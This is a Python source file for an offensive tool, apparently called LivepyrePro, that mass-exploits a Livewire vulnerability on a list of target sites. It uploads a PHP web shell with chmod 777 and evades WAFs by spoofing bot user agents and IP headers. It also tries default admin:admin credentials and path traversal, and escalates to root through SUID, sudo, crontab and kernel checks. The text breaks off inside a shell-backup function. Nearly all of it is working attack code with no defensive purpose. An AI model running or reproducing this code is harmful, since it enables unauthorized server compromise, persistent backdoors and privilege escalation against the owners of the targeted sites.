import subprocess
import os
import requests
import time
import base64
import concurrent.futures
import urllib3
import random
import json
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor

# --- AUTO SKIP SSL ---
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
os.environ['PYTHONWARNINGS'] = 'ignore'

# --- CONFIG ---
LOCAL_PAYLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads")
LOCAL_PAYLOAD_PATH = os.path.join(LOCAL_PAYLOAD_DIR, "green_shell.php")
SHELL_NAME = "shell.php"
LISTROOT_FILE = "listroot.txt"  # File containing validated root domains
THREADS = 20
CHUNK_SIZE = 8192

# FILES
INPUT_LIST = "list.txt"
VULN_LIST = "vuln.txt"
NOT_VULN = "not.txt"
SHELL_ROOT = "shell.txt"
RED_DIR = "red.txt"
NOT_SHELL = "notshell.txt"
SHELL_RED = "shellred.txt"
ROOT_SUCCESS = "root_success.txt"
BACKUP_FILE = "backup_shell.txt"  # Backup shell list

# WAF BYPASS: staged user agents and headers
USER_AGENTS_STAGE1 = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
]

USER_AGENTS_STAGE2 = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
]

USER_AGENTS_STAGE3 = [
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:121.0) Gecko/20100101 Firefox/121.0",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.duckduckgo.com/",
]

PROXIES = []

# AUTO ROOT: privilege escalation vectors
SUID_PATHS = [
    "/usr/bin/find", "/usr/bin/nano", "/usr/bin/vim", "/usr/bin/vi",
    "/usr/bin/emacs", "/usr/bin/sudo", "/usr/bin/python3", "/usr/bin/python",
    "/usr/bin/perl", "/usr/bin/php", "/usr/bin/bash", "/bin/sh", "/bin/bash",
    "/usr/bin/at", "/usr/bin/chsh", "/usr/bin/chfn", "/usr/bin/gawk",
    "/usr/bin/mawk", "/usr/bin/dbus-daemon", "/usr/libexec/dbus-daemon",
    "/usr/libexec/polkitd", "/usr/sbin/unix_chkpwd",
]

COMMON_SUDOERS = [
    "nano", "vim", "vi", "less", "more", "find", "python", "python3",
    "perl", "php", "bash", "sh", "awk", "gawk", "mawk", "snap", "flatpak",
    "dpkg", "apt", "yum", "dnf", "pip", "pip3", "git", "docker", "systemctl",
]

# GREEN DIR: writable path patterns (staged)
GREEN_DIRS_STAGE1 = ["/", "/burjo.php", "/shell.php", "/wshell.php", "/c99.php"]
GREEN_DIRS_STAGE2 = ["/uploads/", "/files/", "/images/", "/media/", "/attachments/", "/upload/", "/file/", "/content/", "/assets/"]
GREEN_DIRS_STAGE3 = ["/storage/", "/public/storage/", "/storage/app/", "/storage/web/", "/var/www/html/", "/var/www/", "/srv/www/", "/home/www/"]
GREEN_DIRS_STAGE4 = ["/tmp/", "/var/tmp/", "/dev/shm/", "/run/", "/opt/", "/home/", "/root/", "/usr/share/", "/var/lib/"]
GREEN_DIRS_STAGE5 = ["/var/www/uploads/", "/var/www/files/", "/var/www/media/", "/home/*/public_html/", "/home/*/www/", "/var/www/site/", "/htdocs/", "/public_html/", "/web/", "/www/"]
GREEN_DIR_TRAVERSAL = ["../../", "../../../", "../../../../", "../../../../../", "..%2f..%2f", "..%2f..%2f..%2f", "....//....//"]

console = Console()


class WAFBypassEngine:
    """Stage-based WAF bypass engine with rotating headers, delays, and proxies."""

    def __init__(self):
        self.current_stage = 0
        self.waf_detected = False
        self.blocked_patterns = ["404", "403", "406", "503", "WAF", "Cloudflare", "ModSecurity", "AWS WAF", "Imperva", "Akamai", "Sucuri", "FireWall", "access denied", "forbidden", "bot detected", "not found", "page not found"]

    def detect_waf(self, response_text, status_code, headers):
        text = response_text.lower()
        status = str(status_code)
        for pattern in self.blocked_patterns:
            if pattern.lower() in text or pattern.lower() in status:
                return True
        for header_key, header_val in headers.items():
            if any(w in header_val.lower() for w in ["cloudflare", "modsecurity", "imperva", "akamai", "sucuri", "aws-waf"]):
                return True
        return False

    def get_headers(self, stage):
        base_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        if stage == 0:
            base_headers["User-Agent"] = random.choice(USER_AGENTS_STAGE1)
            base_headers["Referer"] = random.choice(REFERERS)
        elif stage == 1:
            base_headers["User-Agent"] = random.choice(USER_AGENTS_STAGE2)
            base_headers["Referer"] = random.choice(REFERERS)
            base_headers["X-Forwarded-For"] = self._random_ip()
        elif stage == 2:
            base_headers["User-Agent"] = random.choice(USER_AGENTS_STAGE3)
            base_headers["Referer"] = random.choice(REFERERS)
            base_headers["X-Forwarded-For"] = self._random_ip()
            base_headers["X-Real-IP"] = self._random_ip()
        elif stage == 3:
            base_headers["User-Agent"] = random.choice(USER_AGENTS_STAGE1 + USER_AGENTS_STAGE2 + USER_AGENTS_STAGE3)
            base_headers["Referer"] = "https://" + self._random_domain()
            base_headers["X-Forwarded-For"] = self._random_ip()
            base_headers["X-Real-IP"] = self._random_ip()
            base_headers["X-Original-URL"] = "/"
            base_headers["X-Rewrite-URL"] = "/"
            base_headers["Cache-Control"] = "no-cache"
            base_headers["Pragma"] = "no-cache"
        elif stage >= 4:
            base_headers["User-Agent"] = random.choice(USER_AGENTS_STAGE1 + USER_AGENTS_STAGE2 + USER_AGENTS_STAGE3)
            base_headers["Referer"] = "https://" + self._random_domain()
            base_headers["X-Forwarded-For"] = self._random_ip()
            base_headers["X-Real-IP"] = self._random_ip()
            base_headers["CF-Connecting-IP"] = self._random_ip()
            base_headers["True-Client-IP"] = self._random_ip()
            base_headers["X-Forwarded-Host"] = self._random_domain()
            base_headers["X-Forwarded-Port"] = str(random.randint(80, 443))
            base_headers["X-Forwarded-Proto"] = random.choice(["http", "https"])
        return base_headers

    def get_delay(self, stage):
        delays = {0: 0, 1: 0.5, 2: 1.0, 3: 1.5, 4: 2.0}
        return delays.get(stage, 1.0) + random.uniform(0, 0.5)

    def get_proxy(self, stage):
        if stage >= 4 and PROXIES:
            return {"http": random.choice(PROXIES), "https": random.choice(PROXIES)}
        return {}

    def _random_ip(self):
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def _random_domain(self):
        tlds = ["com", "id", "co.id", "go.id", "ac.id", "net", "org"]
        domains = ["google", "bing", "yahoo", "duckduckgo", "baidu", "yandex"]
        return f"{random.choice(domains)}.{random.choice(tlds)}"

    def next_stage(self):
        self.current_stage = min(self.current_stage + 1, 4)
        console.print(f"[yellow][WAF] Stage advanced to {self.current_stage}[/yellow]")

    def reset(self):
        self.current_stage = 0
        self.waf_detected = False


class HTTPStatusBypass:
    """Bypass HTTP status codes: 404, 403, 302/303, 500, 503, etc."""

    STATUS_CODES = {
        "404": "Not Found",
        "403": "Forbidden",
        "302": "Found (Redirect)",
        "303": "See Other (Redirect)",
        "301": "Moved Permanently",
        "500": "Internal Server Error",
        "502": "Bad Gateway",
        "503": "Service Unavailable",
        "400": "Bad Request",
        "401": "Unauthorized",
    }

    def __init__(self):
        self.bypass_strategies = {
            "404": self._bypass_404,
            "403": self._bypass_403,
            "302": self._bypass_redirect,
            "303": self._bypass_redirect,
            "301": self._bypass_redirect,
            "500": self._bypass_500,
            "502": self._bypass_502,
            "503": self._bypass_503,
            "400": self._bypass_400,
            "401": self._bypass_401,
        }
        self.strategy_attempts = 0
        self.max_strategy_attempts = 5

    def detect_blocked_status(self, status_code):
        """Check if the status code indicates a block/error."""
        code_str = str(status_code)
        if code_str in ["403", "404", "401", "400", "500", "502", "503"]:
            return True
        if code_str.startswith("3") and code_str != "304":
            return True  # Redirects can indicate blocking
        return False

    def classify_status(self, status_code, response_text=""):
        """Classify the HTTP status and suggest bypass strategy."""
        code_str = str(status_code)
        text_lower = response_text.lower()

        classification = {
            "code": code_str,
            "type": None,
            "suggestion": None,
            "bypassable": False,
        }

        if code_str == "404":
            if "not found" in text_lower or "404" in text_lower:
                classification["type"] = "404_not_found"
                classification["suggestion"] = "Try URL encoding, path manipulation, or trailing slash"
                classification["bypassable"] = True
        elif code_str == "403":
            classification["type"] = "403_forbidden"
            classification["suggestion"] = "Try method switching, header spoofing, or encoding bypass"
            classification["bypassable"] = True
        elif code_str in ["301", "302", "303"]:
            classification["type"] = f"{code_str}_redirect"
            classification["suggestion"] = "Follow redirect chain or change request method"
            classification["bypassable"] = True
        elif code_str == "500":
            classification["type"] = "500_error"
            classification["suggestion"] = "Reduce payload size, change encoding, or split request"
            classification["bypassable"] = True
        elif code_str == "502":
            classification["type"] = "502_gateway"
            classification["suggestion"] = "Retry with delay or different proxy"
            classification["bypassable"] = True
        elif code_str == "503":
            classification["type"] = "503_unavailable"
            classification["suggestion"] = "Rate limit detected - add delays or rotate IPs"
            classification["bypassable"] = True
        elif code_str == "400":
            classification["type"] = "400_bad_request"
            classification["suggestion"] = "Fix request formatting, try different encoding"
            classification["bypassable"] = True
        elif code_str == "401":
            classification["type"] = "401_unauthorized"
            classification["suggestion"] = "Add authentication headers or try auth bypass"
            classification["bypassable"] = True

        return classification

    # ---- BYPASS STRATEGIES ----

    def _bypass_404(self, target, payload, session, waf_engine, stage):
        """Bypass 404: Try multiple URL variations."""
        target_clean = target.strip().rstrip('/')
        if not target_clean.startswith("http"):
            target_clean = "http://" + target_clean

        strategies = []
        path = target_clean

        # Strategy 1: Add trailing slash
        strategies.append(f"{path}/")

        # Strategy 2: Add query parameter
        strategies.append(f"{path}?id=0")

        # Strategy 3: Double encoding
        strategies.append(f"{path}%252f")

        # Strategy 4: URL encode the payload path
        strategies.append(f"{path}%2f")

        # Strategy 5: Add index.php
        strategies.append(f"{path}/index.php")

        # Strategy 6: Add .php extension
        strategies.append(f"{path}.php")

        # Strategy 7: Add %20 (space encoding)
        strategies.append(f"{path}%20")

        # Strategy 8: Null byte (legacy)
        strategies.append(f"{path}%00")

        return strategies

    def _bypass_403(self, target, payload, session, waf_engine, stage):
        """Bypass 403: Try method switching and header tricks."""
        target_clean = target.strip().rstrip('/')
        if not target_clean.startswith("http"):
            target_clean = "http://" + target_clean

        strategies = []

        # Strategy 1: Try GET instead of POST
        strategies.append(("GET", target_clean))

        # Strategy 2: Add X-Forwarded-For with bypass
        headers = waf_engine.get_headers(stage)
        headers["X-Forwarded-For"] = "127.0.0.1"
        headers["X-Real-IP"] = "127.0.0.1"
        headers["X-Original-URL"] = target_clean
        strategies.append(("GET", target_clean, headers))

        # Strategy 3: Try PUT method
        strategies.append(("PUT", target_clean))

        # Strategy 4: Try HEAD method
        strategies.append(("HEAD", target_clean))

        # Strategy 5: Add X-HTTP-Method-Override
        headers2 = waf_engine.get_headers(stage)
        headers2["X-HTTP-Method-Override"] = "GET"
        strategies.append(("GET", target_clean, headers2))

        # Strategy 6: Try with different Accept header
        headers3 = waf_engine.get_headers(stage)
        headers3["Accept"] = "*/*"
        strategies.append(("GET", target_clean, headers3))

        # Strategy 7: Try with basic auth bypass
        headers4 = waf_engine.get_headers(stage)
        headers4["Authorization"] = "Basic dXNlcjpwYXNz"  # user:pass
        strategies.append(("GET", target_clean, headers4))

        return strategies

    def _bypass_redirect(self, target, payload, session, waf_engine, stage):
        """Bypass 301/302/303: Follow redirect or change method."""
        target_clean = target.strip().rstrip('/')
        if not target_clean.startswith("http"):
            target_clean = "http://" + target_clean

        strategies = []

        # Strategy 1: Allow redirects (default requests behavior)
        strategies.append(("FOLLOW_REDIRECT", target_clean))

        # Strategy 2: Change to GET to handle redirect
        headers = waf_engine.get_headers(stage)
        headers["Referer"] = target_clean
        strategies.append(("GET", target_clean, headers))

        # Strategy 3: Add origin header
        headers2 = waf_engine.get_headers(stage)
        headers2["Origin"] = target_clean.replace("http://", "https://").replace("https://", "http://")
        strategies.append(("GET", target_clean, headers2))

        return strategies

    def _bypass_500(self, target, payload, session, waf_engine, stage):
        """Bypass 500: Reduce payload size or change encoding."""
        target_clean = target.strip().rstrip('/')
        if not target_clean.startswith("http"):
            target_clean = "http://" + target_clean

        strategies = []

        # Strategy 1: Shorten payload
        strategies.append(("SHORT_PAYLOAD", target_clean))

        # Strategy 2: Try minimal command
        strategies.append(("MINIMAL", target_clean))

        # Strategy 3: Try URL-encoded payload
        strategies.append(("URL_ENCODED", target_clean))

        return strategies

    def _bypass_502(self, target, payload, session, waf_engine, stage):
        """Bypass 502: Retry with different proxy or delay."""
        strategies = []
        # Just retry with different approach
        strategies.append(("RETRY", target.strip().rstrip('/')))
        return strategies

    def _bypass_503(self, target, payload, session, waf_engine, stage):
        """Bypass 503: Rate limit - add delays and rotate."""
        strategies = []
        # Add significant delay and try different UA
        headers = waf_engine.get_headers(stage)
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        strategies.append(("SLOW_RETRY", target.strip().rstrip('/'), headers))
        return strategies

    def _bypass_400(self, target, payload, session, waf_engine, stage):
        """Bypass 400: Fix request formatting."""
        target_clean = target.strip().rstrip('/')
        if not target_clean.startswith("http"):
            target_clean = "http://" + target_clean

        strategies = []
        # Try simpler payload
        strategies.append(("FIX_FORMAT", target_clean))
        # Try without special chars
        strategies.append(("SIMPLE", target_clean))
        return strategies

    def _bypass_401(self, target, payload, session, waf_engine, stage):
        """Bypass 401: Add auth headers."""
        target_clean = target.strip().rstrip('/')
        if not target_clean.startswith("http"):
            target_clean = "http://" + target_clean

        strategies = []
        # Try various auth combinations
        headers = waf_engine.get_headers(stage)
        headers["Authorization"] = "Basic YWRtaW46YWRtaW4="  # admin:admin
        strategies.append(("GET", target_clean, headers))

        headers2 = waf_engine.get_headers(stage)
        headers2["Authorization"] = "Bearer token"
        strategies.append(("GET", target_clean, headers2))
        return strategies

    def apply_bypass(self, status_code, target, payload, session, waf_engine, stage=0):
        """Apply bypass strategy for a given status code."""
        code_str = str(status_code)

        if code_str not in self.bypass_strategies:
            return None

        strategies = self.bypass_strategies[code_str](target, payload, session, waf_engine, stage)
        return strategies

    def execute_bypass(self, status_code, target, payload, session, waf_engine, stage=0):
        """Execute bypass and return result."""
        strategies = self.apply_bypass(status_code, target, payload, session, waf_engine, stage)
        if not strategies:
            return None

        for strategy in strategies:
            try:
                method = strategy[0]
                target_url = strategy[1]
                headers = strategy[2] if len(strategy) > 2 else waf_engine.get_headers(stage)

                if method == "GET":
                    r = session.get(target_url, headers=headers, timeout=5, allow_redirects=True)
                elif method == "POST":
                    r = session.post(target_url, headers=headers, timeout=5, allow_redirects=True)
                elif method == "PUT":
                    r = session.put(target_url, headers=headers, timeout=5, allow_redirects=True)
                elif method == "HEAD":
                    r = session.head(target_url, headers=headers, timeout=5, allow_redirects=True)
                elif method == "FOLLOW_REDIRECT":
                    r = session.get(target_url, headers=headers, timeout=5, allow_redirects=True)
                elif method == "SHORT_PAYLOAD":
                    r = session.post(target_url, headers=headers, timeout=5, data="id", allow_redirects=True)
                elif method == "MINIMAL":
                    r = session.get(target_url, headers=headers, timeout=5)
                elif method == "RETRY":
                    time.sleep(2)
                    r = session.get(target_url, headers=headers, timeout=5, allow_redirects=True)
                elif method == "SLOW_RETRY":
                    time.sleep(5)
                    r = session.get(target_url, headers=headers, timeout=10, allow_redirects=True)
                elif method == "FIX_FORMAT":
                    r = session.get(target_url, headers=headers, timeout=5)
                elif method == "SIMPLE":
                    r = session.get(target_url, headers=headers, timeout=5)
                else:
                    continue

                # Check if bypass worked (got 200)
                if r.status_code == 200:
                    return {"success": True, "method": method, "url": target_url, "status": r.status_code}

                # Check if still blocked but different status
                if self.detect_blocked_status(r.status_code):
                    # Try next strategy
                    continue

                return {"success": False, "method": method, "url": target_url, "status": r.status_code}

            except Exception:
                continue

        return None

    def check_and_bypass(self, target, payload, session, waf_engine, stage=0):
        """Check status code and automatically apply bypass."""
        target_clean = target.strip().rstrip('/')
        if not target_clean.startswith("http"):
            target_clean = "http://" + target_clean

        try:
            headers = waf_engine.get_headers(stage)
            # First try normal request
            r = session.post(target_clean, data=payload, headers=headers, timeout=5, allow_redirects=False)
            status = r.status_code

            if status == 200:
                return {"success": True, "status": status, "bypass_needed": False}

            if self.detect_blocked_status(status):
                # Classify and try bypass
                classification = self.classify_status(status, r.text)
                console.print(f"[red][HTTP {status}] {classification['suggestion']}[/red]")

                result = self.execute_bypass(status, target_clean, payload, session, waf_engine, stage)
                if result and result.get("success"):
                    console.print(f"[green][BYPASS] Success via {result['method']}[/green]")
                    return {"success": True, "status": result["status"], "bypass_needed": True, "method": result["method"]}
                else:
                    console.print(f"[red][BYPASS FAILED] HTTP {status}[/red]")
                    return {"success": False, "status": status, "bypass_needed": True, "classification": classification}

            return {"success": False, "status": status, "bypass_needed": False}
        except Exception as e:
            return {"success": False, "error": str(e)}


class AutoRootEngine:
    """Stage-based auto root escalation engine (5 stages)."""

    def __init__(self, session):
        self.session = session
        self.root_status = "not_checked"
        self.escalation_results = []

    def check_identity(self, target):
        """Stage 1: Check current user identity via web shell."""
        console.print(f"[cyan][ROOT STAGE 1][/cyan] Checking identity on {target}")
        try:
            res = self.session.get(f"{target}/id", timeout=5)
            output = res.text
            if "uid=0" in output or "root" in output.lower():
                self.root_status = "already_root"
                console.print("[bold green][ROOT] Target already running as root![/bold green]")
                self.escalation_results.append({"stage": 1, "result": "already_root"})
                return True
            else:
                console.print(f"[yellow][ROOT STAGE 1] User: {output.strip()}[/yellow]")
                self.escalation_results.append({"stage": 1, "result": f"user: {output.strip()}"})
                return False
        except:
            return False

    def check_suid(self, target):
        """Stage 2: Enumerate SUID binaries for privilege escalation."""
        console.print(f"[cyan][ROOT STAGE 2][/cyan] Enumerating SUID binaries on {target}")
        suid_found = []
        for binary in SUID_PATHS:
            try:
                res = self.session.get(f"{target}/find_suid?path={binary}", timeout=3)
                if res.status_code == 200 and any(x in res.text for x in ["rws", "SUID", "4755", "setuid"]):
                    suid_found.append(binary)
                    console.print(f"[green][SUID] Found: {binary}[/green]")
            except:
                pass
        if suid_found:
            self.root_status = "suid_found"
            self.escalation_results.append({"stage": 2, "result": f"suid: {suid_found}"})
            console.print(f"[bold green][ROOT] SUID binaries found: {suid_found}[/bold green]")
            return suid_found
        self.escalation_results.append({"stage": 2, "result": "no_suid"})
        return None

    def check_sudo(self, target):
        """Stage 3: Check sudo privileges for known sudoers."""
        console.print(f"[cyan][ROOT STAGE 3][/cyan] Checking sudo privileges on {target}")
        for cmd in COMMON_SUDOERS:
            try:
                payload = f"sudo -l -U {cmd}"
                res = self.session.get(f"{target}/cmd?exec={payload}", timeout=3)
                if res.status_code == 200 and (("(root)" in res.text) or ("NOPASSWD" in res.text)):
                    self.root_status = "sudo_found"
                    self.escalation_results.append({"stage": 3, "result": f"sudo: {cmd}"})
                    console.print(f"[bold green][ROOT] Sudo access: {cmd}[/bold green]")
                    return cmd
            except:
                pass
        self.escalation_results.append({"stage": 3, "result": "no_sudo"})
        return None

    def check_crontab(self, target):
        """Stage 4: Try writable crontab for persistence."""
        console.print(f"[cyan][ROOT STAGE 4][/cyan] Checking writable crontab on {target}")
        try:
            res = self.session.get(f"{target}/cmd?exec=crontab+-l", timeout=3)
            if res.status_code == 200:
                console.print(f"[green][CRONTAB] Accessible: {res.text[:100]}[/green]")
                res2 = self.session.get(f"{target}/cmd?exec=crontab+-c+%2Fvar%2Fspool%2Fcron+crontab", timeout=3)
                if res2.status_code == 200:
                    self.root_status = "crontab_writable"
                    self.escalation_results.append({"stage": 4, "result": "crontab_writable"})
                    console.print("[bold green][ROOT] Writable crontab found![/bold green]")
                    return True
        except:
            pass
        self.escalation_results.append({"stage": 4, "result": "no_crontab"})
        return False

    def check_kernel(self, target):
        """Stage 5: Attempt kernel-based escalation."""
        console.print(f"[cyan][ROOT STAGE 5][/cyan] Attempting kernel escalation on {target}")
        kernel_cmds = ["uname -r", "cat /proc/version", "cat /proc/sys/kernel/osrelease"]
        kernel_info = []
        for cmd in kernel_cmds:
            try:
                res = self.session.get(f"{target}/cmd?exec={cmd}", timeout=3)
                if res.status_code == 200:
                    kernel_info.append(res.text.strip())
            except:
                pass
        if kernel_info:
            self.escalation_results.append({"stage": 5, "result": f"kernel: {kernel_info}"})
            console.print(f"[yellow][KERNEL] Info: {kernel_info}[/yellow]")
            for info in kernel_info:
                if any(v in info for v in ["4.", "3.", "2.", "5.", "6."]):
                    console.print("[yellow][ROOT] Kernel may be exploitable - check CVE database[/yellow]")
            return kernel_info
        return None

    def escalate(self, target, session):
        """Run all root escalation stages sequentially."""
        console.print(f"\n[bold blue]══════ AUTO ROOT ESCALATION: {target} ══════[/bold blue]")
        self.session = session

        if self.root_status == "not_checked":
            self.check_identity(target)
        if self.root_status == "already_root":
            return self.escalation_results
        self.check_suid(target)
        if self.root_status == "suid_found":
            return self.escalation_results
        self.check_sudo(target)
        if self.root_status == "sudo_found":
            return self.escalation_results
        self.check_crontab(target)
        if self.root_status == "crontab_writable":
            return self.escalation_results
        self.check_kernel(target)

        console.print(f"\n[bold green][ROOT ESCALATION COMPLETE] Status: {self.root_status}[/bold green]")
        return self.escalation_results


class GreenDirEngine:
    """Stage-based green directory scanner for writable web paths."""

    def __init__(self, session):
        self.session = session
        self.green_paths = []

    def scan_stage1(self, target, shell_url):
        """Stage 1: Default web root paths."""
        console.print(f"[cyan][GREEN DIR STAGE 1][/cyan] Scanning default paths on {target}")
        found = []
        for path in GREEN_DIRS_STAGE1 + [shell_url]:
            full_url = f"{target}{path}"
            try:
                res = self.session.get(full_url, timeout=3)
                if res.status_code == 200:
                    found.append(full_url)
                    console.print(f"[green][GREEN] Found: {full_url}[/green]")
            except:
                pass
        return found

    def scan_stage2(self, target, shell_url):
        """Stage 2: Common upload directories."""
        console.print(f"[cyan][GREEN DIR STAGE 2][/cyan] Scanning upload dirs on {target}")
        found = []
        for path in GREEN_DIRS_STAGE2:
            full_url = f"{target}{path}{shell_url}"
            try:
                res = self.session.get(full_url, timeout=3)
                if res.status_code == 200:
                    found.append(full_url)
                    console.print(f"[green][GREEN] Found: {full_url}[/green]")
            except:
                pass
        return found

    def scan_stage3(self, target, shell_url):
        """Stage 3: Storage paths."""
        console.print(f"[cyan][GREEN DIR STAGE 3][/cyan] Scanning storage paths on {target}")
        found = []
        for path in GREEN_DIRS_STAGE3:
            full_url = f"{target}{path}{shell_url}"
            try:
                res = self.session.get(full_url, timeout=3)
                if res.status_code == 200:
                    found.append(full_url)
                    console.print(f"[green][GREEN] Found: {full_url}[/green]")
            except:
                pass
        return found

    def scan_stage4(self, target, shell_url):
        """Stage 4: System temp/home paths."""
        console.print(f"[cyan][GREEN DIR STAGE 4][/cyan] Scanning system paths on {target}")
        found = []
        for path in GREEN_DIRS_STAGE4:
            full_url = f"{target}{path}{shell_url}"
            try:
                res = self.session.get(full_url, timeout=3)
                if res.status_code == 200:
                    found.append(full_url)
                    console.print(f"[green][GREEN] Found: {full_url}[/green]")
            except:
                pass
        return found

    def scan_stage5(self, target, shell_url):
        """Stage 5: Directory traversal brute force."""
        console.print(f"[cyan][GREEN DIR STAGE 5][/cyan] Scanning traversal paths on {target}")
        found = []
        for traversal in GREEN_DIR_TRAVERSAL:
            for path in GREEN_DIRS_STAGE5:
                full_url = f"{target}{traversal}{path}{shell_url}"
                try:
                    res = self.session.get(full_url, timeout=3)
                    if res.status_code == 200:
                        found.append(full_url)
                        console.print(f"[green][GREEN TRAVERSAL] Found: {full_url}[/green]")
                except:
                    pass
        return found

    def scan_all(self, target, shell_url, session):
        """Run all green dir stages sequentially."""
        self.session = session
        console.print(f"\n[bold blue]══════ GREEN DIR SCANNER: {target} ══════[/bold blue]")
        all_found = []

        stages = [
            ("Stage 1 (Default)", lambda: self.scan_stage1(target, shell_url)),
            ("Stage 2 (Upload)", lambda: self.scan_stage2(target, shell_url)),
            ("Stage 3 (Storage)", lambda: self.scan_stage3(target, shell_url)),
            ("Stage 4 (System)", lambda: self.scan_stage4(target, shell_url)),
            ("Stage 5 (Traversal)", lambda: self.scan_stage5(target, shell_url)),
        ]

        for stage_name, stage_func in stages:
            console.print(f"\n[yellow]{stage_name}[/yellow]")
            results = stage_func()
            all_found.extend(results)
            if results:
                console.print(f"[green]{len(results)} paths found in {stage_name}[/green]")

        self.green_paths = all_found
        if all_found:
            console.print(f"\n[bold green][GREEN DIR] Total writable paths found: {len(all_found)}[/bold green]")
            for p in all_found:
                console.print(f"  [green]→ {p}[/green]")
        else:
            console.print(f"\n[red][GREEN DIR] No writable paths found[/red]")
        return all_found


class LivepyrePro:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 7
        self.waf_engine = WAFBypassEngine()
        self.status_bypass = HTTPStatusBypass()
        self.root_engine = AutoRootEngine(self.session)
        self.green_engine = GreenDirEngine(self.session)

    def write(self, file, data):
        with open(file, "a") as f:
            f.write(data + "\n")

    def run_cmd(self, target, payload, waf_stage=0):
        try:
            headers = self.waf_engine.get_headers(waf_stage)
            proxy = self.waf_engine.get_proxy(waf_stage)
            delay = self.waf_engine.get_delay(waf_stage)
            time.sleep(delay)
            res = subprocess.run(
                ["python3", "inti.py", "-u", target, "-f", "system", "-p", payload],
                capture_output=True, text=True, timeout=25,
                env={**os.environ, "HTTP_HEADERS": json.dumps(headers)}
            )
            return res.stdout
        except:
            return ""

    def check_waf_and_retry(self, target, payload):
        """Try payload with WAF bypass stages (0-4) AND HTTP status code bypass."""
        self.waf_engine.reset()
        
        # First: Check HTTP status code bypass
        status_result = self.status_bypass.check_and_bypass(target, payload, self.session, self.waf_engine)
        if status_result and status_result.get("success"):
            if not status_result.get("bypass_needed"):
                console.print(f"[green][HTTP OK] Direct 200 response[/green]")
            else:
                console.print(f"[green][HTTP BYPASS] Status code bypassed: {status_result.get('method')}[/green]")
        
        for stage in range(5):
            if stage > 0:
                self.waf_engine.next_stage()
            output = self.run_cmd(target, payload, waf_stage=stage)
            fake_resp = type('obj', (object,), {'text': output, 'status_code': 200, 'headers': {}})()
            if self.waf_engine.detect_waf(fake_resp.text, fake_resp.status_code, fake_resp.headers):
                console.print(f"[red][WAF] Blocked at stage {stage}, trying next...[/red]")
                # Try HTTP status bypass as fallback
                status_result2 = self.status_bypass.check_and_bypass(target, payload, self.session, self.waf_engine, stage)
                if status_result2 and status_result2.get("success"):
                    console.print(f"[green][HTTP BYPASS] Success via status bypass at stage {stage}[/green]")
                    return output
                continue
            if output and ("uid=" in output or "vulnerable" in output.lower()):
                console.print(f"[green][WAF BYPASS] Success at stage {stage}[/green]")
                return output
            time.sleep(self.waf_engine.get_delay(stage))
        return ""

    def upload_local_shell(self, target, path_on_target="shell.php", waf_stage=0):
        """Upload shell from local file to target via Livewire exploit."""
        try:
            target_clean = target.strip().rstrip('/')
            if not target_clean.startswith("http"):
                target_clean = "http://" + target_clean

            # Langsung download dari local payload ke target
            payload_root = f"curl -sL file://{LOCAL_PAYLOAD_PATH} -o {path_on_target} && chmod 777 {path_on_target}"
            output = self.check_waf_and_retry(target_clean, payload_root)

            if output or self.verify_shell(target_clean, path_on_target):
                console.print(f"[green][UPLOAD SUCCESS] {target_clean}/{path_on_target}[/green]")
                return True

            return False
        except Exception as e:
            console.print(f"[red][UPLOAD ERROR] {target}: {e}[/red]")
            return False

    def verify_shell(self, target, path_on_target):
        """Verify the uploaded shell is accessible and functional."""
        try:
            target_clean = target.strip().rstrip('/')
            if not target_clean.startswith("http"):
                target_clean = "http://" + target_clean

            check_url = f"{target_clean}/{path_on_target}"
            headers = self.waf_engine.get_headers(self.waf_engine.current_stage)
            r = self.session.get(check_url, headers=headers, timeout=5)

            # Check for local shell indicators:
            if r.status_code == 200:
                text_lower = r.text.lower()
                if ("shell" in text_lower or "cmd" in text_lower or 
                    "login" in text_lower or "command" in text_lower or
                    "waf bypass" in text_lower or "session" in text_lower or
                    len(r.text) > 50):
                    return True

            # Also try POST to test command execution
            test_payload = "ajax=true&action=execute_command&command=id"
            r2 = self.session.post(check_url, data=test_payload, headers=headers, timeout=5)
            if r2.status_code == 200:
                return True

            # Try with login POST (edited shell has login)
            login_payload = "username=test&password=test&login=Login"
            r3 = self.session.post(check_url, data=login_payload, headers=headers, timeout=5)
            if r3.status_code == 200:
                return True

            return False
        except:
            return False

    def backup_shell(self, target, shell_url, backup_dir=None):
        """Backup a shell from target by downloading it locally."""
        if backup_dir is None:
            BASE_DIR = os.path.dirname(os.path.abspath(__file__))
            backup_dir = os.path.join(BASE_DIR, "backups")
        try:
            target_clean = target.strip().rstrip('/')
            if not target_clean.startswith("http"):
                target_clean = "http://" + target_clean

            check_url = f"{target_clean}/{shell_url}"
            headers = self.waf_engine.get_headers(self.waf_engine.current_stage)
            r = self.session.get(check_url, headers=headers, timeout=10)

